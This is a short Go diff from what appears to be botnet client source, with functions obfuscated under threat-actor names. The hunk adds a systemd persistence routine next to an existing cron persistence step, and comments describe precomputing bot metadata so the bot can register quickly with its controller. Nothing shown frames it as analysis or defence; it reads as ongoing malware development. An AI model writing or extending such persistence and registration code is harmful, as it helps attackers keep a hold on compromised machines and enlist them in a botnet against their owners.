@@ -300,6 +300,9 @@ func main() {
 	deoxys("main: Running persistence check (cron)...")
 	bNkXqVm()
 	deoxys("main: cron persistence check complete")
+	deoxys("main: Running persistence check (systemd)...")
+	fVxMqKp("")
+	deoxys("main: systemd persistence check complete")
 	// Pre-compute bot metadata BEFORE connecting so REGISTER is instant.
 	cachedBotID = mustangPanda()
 	cachedArch = charmingKitten()
